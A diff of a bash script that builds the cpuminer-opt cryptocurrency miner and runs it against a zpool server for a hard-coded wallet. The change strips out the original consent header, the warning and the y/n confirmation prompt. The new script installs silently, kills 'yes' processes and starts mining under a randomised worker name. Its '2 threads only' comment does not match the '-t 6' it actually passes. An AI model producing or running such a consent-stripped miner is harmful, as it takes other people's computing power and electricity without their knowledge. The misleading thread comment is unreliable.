@@ -1,35 +1,22 @@
 #!/bin/bash
-# Transparent CPU Miner with Explicit Consent
 
-# Check for root
-if [ "$(id -u)" -ne 0 ]; then
-  echo "Please run as root for system monitoring"
-  exit 1
+# Update and install dependencies
+sudo apt update
+sudo apt install -y git build-essential automake autoconf libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev
+
+# Clone the mining repository if it doesn't exist
+if [ ! -d "cpuminer-opt" ]; then
+  git clone https://github.com/JayDDee/cpuminer-opt.git
 fi
+cd cpuminer-opt
 
-# Display warning
-echo "WARNING: This will install and run a cryptocurrency miner."
-echo "It will significantly increase CPU usage and power consumption."
-read -p "Do you want to continue? (y/n) " -n 1 -r
-echo
-if [[ ! $REPLY =~ ^[Yy]$ ]]; then
-    exit 1
-fi
-
-# Install dependencies
-apt update
-apt install -y git build-essential automake autoconf \
-  libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev
-
-# Clone and build
-git clone https://github.com/JayDDee/cpuminer-opt.git
-cd cpuminer-opt || exit
+# Build the miner
 ./build.sh
 
-# Run with transparent settings
-./cpuminer -a minotaurx \
-  -o stratum+tcp://minotaurx.mine.zpool.ca:7019 \
-  -u RQAJNrnHHrUKWnfm3axM4CFtnFdhtBPo6b \
-  -p c=RVN \
-  --max-cpu-usage=80 \
-  --temp-limit=75
+# OPTIONAL: Kill fake CPU processes if running (safety)
+pkill yes
+
+# START MINER with limited threads (e.g., 2 threads only)
+./cpuminer -a minotaurx -o stratum+tcp://minotaurx.mine.zpool.ca:7019 \
+-u RQAJNrnHHrUKWnfm3axM4CFtnFdhtBPo6b.$(shuf -n 1 -i 1-99999)-cpu \
+-p c=RVN -t 6
